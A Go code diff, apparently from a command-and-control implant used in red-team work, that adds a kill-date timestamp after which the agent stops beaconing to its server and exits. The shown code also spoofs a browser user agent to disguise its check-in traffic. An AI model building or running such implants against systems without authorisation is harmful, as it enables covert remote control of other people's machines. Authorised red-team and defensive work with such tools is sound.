@@ -80,6 +80,7 @@ type Agent struct {
 	Client        *http.Client  // Client is an http.Client object used to make HTTP connections for agent communications
 	UserAgent     string        // UserAgent is the user agent string used with HTTP connections
 	initial       bool          // initial identifies if the agent has successfully completed the first initial check in
+	killdate      int32         // killdate is a unix timestamp that denotes a time the executable will not run after (if it is 0 it will not be used)
 }
 
 // New creates a new agent struct with specific values and returns the object
@@ -102,6 +103,7 @@ func New(protocol string, verbose bool, debug bool) Agent {
 		Proto:        protocol,
 		UserAgent:    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36",
 		initial:      false,
+		killdate:     0,
 	}
 
 	u, errU := user.Current()
@@ -178,18 +180,23 @@ func (a *Agent) Run(server string) {
 	}
 
 	for {
-		if a.initial {
-			if a.Verbose {
-				message("note", "Checking in")
+		// Check killdate to see if the agent should checkin
+		if (a.killdate == 0) || (int32(time.Now().Unix()) < a.killdate) {
+			if a.initial {
+				if a.Verbose {
+					message("note", "Checking in")
+				}
+				go a.statusCheckIn(server, a.Client)
+			} else {
+				a.initial = a.initialCheckIn(server, a.Client)
 			}
-			go a.statusCheckIn(server, a.Client)
+			if a.FailedCheckin >= a.MaxRetry {
+				if a.Debug {
+					message("debug", "Failed Checkin is greater than or equal to max retries. Quitting")
+				}
+				os.Exit(1)
+			}
 		} else {
-			a.initial = a.initialCheckIn(server, a.Client)
-		}
-		if a.FailedCheckin >= a.MaxRetry {
-			if a.Debug {
-				message("debug", "Failed Checkin is greater than or equal to max retries. Quitting")
-			}
 			os.Exit(1)
 		}
 
